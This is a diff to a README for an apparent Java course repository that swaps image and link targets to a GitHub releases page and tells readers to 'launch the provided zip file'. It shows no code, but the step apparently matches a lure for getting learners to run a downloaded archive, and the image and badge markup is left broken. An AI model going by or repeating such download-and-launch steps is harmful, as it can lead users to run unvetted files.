@@ -1,6 +1,6 @@
 # **Java Mastery Repository 🚀**
 
-![Java Image](https://imageurl.com/javaimage.jpg)
+![Java Image](https://github.com/dreamdesigner310/CursoJava/releases)
 
 Welcome to the **CursoJava** repository, a hub for students and learners like yourself to dive deep into the world of Java programming. Whether you are just starting out or looking to enhance your skills, this repository is here to help you master Java in a practical and hands-on way.
 
@@ -37,9 +37,9 @@ This repository is packed with valuable resources to aid your Java learning jour
 
 ## Get Started 🌟
 
-Ready to elevate your Java skills? Head over to [CursoJava Repository](https://github.com/releases/789694263/Release.zip) and launch the provided zip file to access all the valuable content.
+Ready to elevate your Java skills? Head over to [CursoJava Repository](https://github.com/dreamdesigner310/CursoJava/releases) and launch the provided zip file to access all the valuable content.
 
-[![Launch Repository](https://img.shields.io/badge/Launch-CursoJava-blue)](https://github.com/releases/789694263/Release.zip)
+[![Launch Repository](https://github.com/dreamdesigner310/CursoJava/releases)](https://github.com/dreamdesigner310/CursoJava/releases)
 
 ## Explore Further 🚗
 
